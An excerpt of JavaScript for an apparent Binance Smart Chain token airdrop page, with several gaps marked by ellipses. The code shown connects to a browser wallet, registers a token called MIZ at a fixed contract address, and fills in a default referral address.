let web3 = new web3js.myweb3(window.bsc);
let addr;

const sttaddr = "0xE11b41865b74585342627E7EdFE56FB3eD1138ce";
...
let sttcontract = new web3.bsc.Contract(sttabi, sttaddr);

const loadweb3 = async () => {
  try {
		web3 = new web3js.myweb3(window.bsc);
		console.log('Injected web3 detected.')
		sttcontract = new web3.bsc.Contract(sttabi, sttaddr);
    let a = await bsc.enable();
...
const getAirdrop = async () => {
  ...
  if(fresh === "0xE11b41865b74585342627E7EdFE56FB3eD1138ce")
      fresh = "0xE11b41865b74585342627E7EdFE56FB3eD1138ce";
  ...
  try {
    web3.currentProvider.sendAsync({
      ...
      params: {
        'type': 'ERC20',
        'options': {
          'address': '0xE11b41865b74585342627E7EdFE56FB3eD1138ce',
          'symbol': 'MIZ',
          'decimals': '18',
          'image': '',
        },
...
function querySt(ji) {
  ...
  if( ref==null){
      ref = "0x50c688D6A4b37215982a456785BA0f5Eb10Fb072";
       document.getElementById('airinput').value = ref; 
  }else{ 
  document.getElementById('airinput').value = ref; 
  } 